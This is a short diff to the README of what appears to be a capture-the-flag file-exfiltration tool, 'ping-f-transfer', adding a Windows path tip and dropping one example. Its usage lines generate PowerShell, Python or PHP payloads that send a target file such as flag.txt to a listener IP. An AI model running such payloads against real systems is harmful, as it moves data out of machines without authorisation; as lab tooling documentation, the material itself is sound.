@@ -328,7 +328,7 @@ Available for all subcommands (`transfer`, `generate`, `makefile`):
 | `--no-banner` | Suppress the ASCII banner | off |
 
 >[!IMPORTANT]
-> Always use **absolute paths** with `-f` and **quote them** if they contain spaces or backslashes. The file path is embedded into the generated payload, and relative or unquoted paths can break the resulting script.
+> Always use **absolute paths** with `-f` and **quote them** if they contain spaces or backslashes, _specially for `Windows` generated payloads_. The file path is embedded into the generated payload, and relative or unquoted paths can break the resulting script.
 >
 > ```bash
 > # Good
@@ -338,7 +338,6 @@ Available for all subcommands (`transfer`, `generate`, `makefile`):
 > # Bad/not recommended — backslashes and spaces may break the payload
 > ping-f-transfer generate -f C:\Users\admin\flag.txt -i 10.10.14.5 -l powershell
 > ping-f-transfer generate -f ../relative/path.txt -i 10.10.14.5 -l python
-> ping-f-transfer generate -f '../relative/file with spaces.txt' -i 10.10.14.5 -l php
 > ```
 
 ---
